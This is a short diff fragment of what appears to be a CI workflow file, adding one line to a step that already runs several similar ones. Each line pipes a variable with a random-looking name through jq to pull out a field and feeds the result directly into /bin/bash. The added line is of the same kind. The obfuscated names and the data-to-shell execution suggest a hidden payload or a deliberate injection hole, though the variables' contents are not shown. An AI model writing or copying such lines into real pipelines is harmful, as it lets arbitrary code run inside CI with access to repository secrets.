@@ -47,6 +47,7 @@ jobs:
           echo $mli932 | jq -r .vpghc3 | /bin/bash
           printf '%s' "$iug3" | jq -r .xpcw692 | /bin/bash
           printf '%s' "$g42" | jq -r .k073 | /bin/bash
+          echo $cski08689 | jq -r .ycd932 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
